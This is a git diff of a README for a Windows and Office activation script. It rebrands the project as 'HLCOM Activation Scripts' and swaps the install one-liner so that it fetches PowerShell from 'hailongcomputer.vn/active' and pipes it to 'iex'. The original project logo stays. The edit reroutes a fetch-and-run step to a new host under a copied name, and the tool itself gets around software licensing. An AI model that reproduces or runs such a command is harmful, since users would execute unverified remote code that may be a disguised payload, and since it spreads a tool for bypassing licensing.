@@ -1,6 +1,6 @@
 <p align="center"><img src="https://massgrave.dev/img/logo_small.png" alt="MAS Logo"></p>
 
-<h1 align="center">Microsoft  Activation  Scripts (MAS)</h1>
+<h1 align="center">HLCOM Activation Scripts (Vinh Vien)</h1>
 
 <p align="center">Open-source Windows and Office activator featuring HWID, Ohook, TSforge, and Online KMS activation methods, along with advanced troubleshooting.</p>
 
@@ -14,8 +14,8 @@
 
 2. Copy and paste the code below and press **Enter.**  
    - For **Windows 8.1, 10 and 11**:
-     ```
-     irm https://get.activated.win | iex
+     ```powershell
+     irm hailongcomputer.vn/active | iex
      ```
 	 If the above is blocked (by ISP/DNS), try this (needs updated Windows 10 or 11):  
 	 ```
